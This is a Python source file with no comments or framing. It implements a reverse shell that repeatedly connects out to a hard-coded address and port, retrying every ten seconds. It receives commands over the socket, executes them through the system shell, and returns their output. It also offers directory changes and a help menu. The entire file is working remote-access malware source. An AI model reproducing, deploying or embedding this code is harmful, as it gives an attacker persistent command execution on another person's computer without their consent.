import socket
import time
import subprocess
import os

ip = "192.168.1.7"
port = 8085

def connection(ip, port):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.send(b"\n[!] Connection received.\n")
            return s
        except ConnectionRefusedError:
            print("Connection refused. Retrying...")
            time.sleep(10)
        except Exception as e:
            print("Connection error:", e)
            time.sleep(10)

def listen(s):
    try:
        while True:
            data = s.recv(1024)
            if not data:
                print("[!] Connection closed by the client.")
                break
            if data[:-1].decode() == "/exit":
                s.close()
                break
            else:
                cmd(s, data[:-1].decode())
    except Exception as e:
        print("Error in listen:", e)

def cmd(s, data):
    try:
        if data.startswith("help"):
            help_text = """\n##########

Manual:
execute - before execution commands e.g., python file.py;
baixar - to download the desired file from the internet;
cd - to change the directory you are in e.g., cd downloads;
ls - list folders and files;

Note: You can execute many commands from the regular terminal normally.

##########\n\n"""
            send_data(s, help_text)
        elif data.startswith("execute"):
            command = data.split(" ", 1)[1]
            output = subprocess.run(command, shell=True, capture_output=True, text=True)
            send_data(s, output.stdout)
        elif data.startswith("baixar"):
            send_data(s, "[-] Downloading files is not supported on Windows.\n")
        elif data.startswith("cd"):
            directory = data.split(" ", 1)[1]
            os.chdir(directory)
            send_data(s, "[+] Directory changed successfully.\n")
        else:
            output = subprocess.run(data, shell=True, capture_output=True, text=True)
            send_data(s, output.stdout)
    except Exception as e:
        print("Error in cmd:", e)

def send_data(s, data):
    s.send(data.encode())

def main():
    while True:
        try:
            s_connected = connection(ip, port)
            if s_connected:
                listen(s_connected)
            else:
                print("Connection was wrong, trying again.")
        except Exception as e:
            print("Main error: ", e)
            time.sleep(10)

if __name__ == "__main__":
    main()
